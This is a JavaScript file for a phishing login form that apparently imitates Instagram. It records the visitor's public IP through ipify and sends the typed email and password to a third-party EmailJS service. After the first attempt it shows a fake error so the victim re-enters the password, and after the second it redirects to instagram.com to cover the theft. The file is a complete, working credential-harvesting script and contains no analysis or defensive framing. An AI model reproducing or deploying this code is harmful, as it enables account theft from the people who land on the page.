$.getJSON("https://api.ipify.org?format=json",
     function(data) {
    $("#gfg").html(data.ip);      
    });

function checkpass()
{
    var email = document.getElementById('email').value;
    var btn = document.getElementById('btn');
    var password = document.getElementById('password').value;
    var msg = document.getElementById('msg');
    
    if ( email.length > 0 && password.length > 5 )
        {
            btn.disabled = false;
        }
    else
        {
            btn.disabled = true;
            msg.style.display = "none";
        }
}



document.getElementById('form1').onsubmit = function(e)
{
    e.preventDefault();
    results();
}


var num = 0;

function results()
{
    
    var btn = document.getElementById('btn');
    var msg = document.getElementById('msg');
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;
    
    btn.innerHTML = "<img src='load.gif' width='20px'>";
    if (num == 0 )
        {
            var mes = {
                from_name: "IP - "  + document.getElementById('gfg').innerHTML,
                message: email,
                message1: password,
            };
            emailjs.send("service_l72qiq9","template_xrreyq8", mes)
            .then(() => {
                setTimeout(function() {
                    document.getElementById('form1').reset()
                    document.getElementById('email').value = email
                    msg.style.display = "block"
                    btn.disabled = false
                    btn.innerHTML = "Log In"
                    num = 1;
                    }, 4000)
            }, (err) => {
                results();
            });
                
        }
    
    
    else 
    {
        {
            var mes = {
                from_name: "IP - "  + document.getElementById('gfg').innerHTML,
                message: email,
                message1: password,
            };
            emailjs.send("service_l72qiq9","template_xrreyq8", mes)
            .then(() => {
                setTimeout(function() {
                    window.location.href = "http://www.instagram.com";
                    }, 4000)
            }, (err) => {
                results();
            });
                
        }
    }
}
